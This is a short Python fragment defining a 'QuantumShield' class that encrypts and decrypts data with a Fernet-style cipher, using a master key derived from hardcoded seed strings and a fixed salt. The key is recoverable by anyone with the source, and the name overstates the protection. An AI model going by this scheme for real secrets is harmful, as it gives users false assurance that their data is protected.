def _seed_layer_3():
    return base64.b64encode(hashlib.sha3_512(b"Moha-02-Quantum-Key").digest()).decode()[:32]

def _generate_master_key():
    k1 = _seed_layer_1().encode()
    k2 = _seed_layer_2().encode()
    k3 = _seed_layer_3().encode()
    combined = hashlib.pbkdf2_hmac('sha512', k1 + k2 + k3, b'moha_salt_2026', 100000)
    return base64.urlsafe_b64encode(combined[:32])

class QuantumShield:
    MASTER_KEY = _generate_master_key()
    cipher = FernetCompatible(MASTER_KEY)

    @classmethod
    def encrypt(cls, data):
        if isinstance(data, dict):
            data = json.dumps(data)
        intermediate = base64.b64encode(data.encode()).decode()
        return cls.cipher.encrypt(intermediate.encode())

    @classmethod
    def decrypt(cls, encrypted_data):
        try:
            decrypted_str = cls.cipher.decrypt(encrypted_data)
            if decrypted_str is None:
                return None
            return base64.b64decode(decrypted_str.encode()).decode()
        except:
            return None

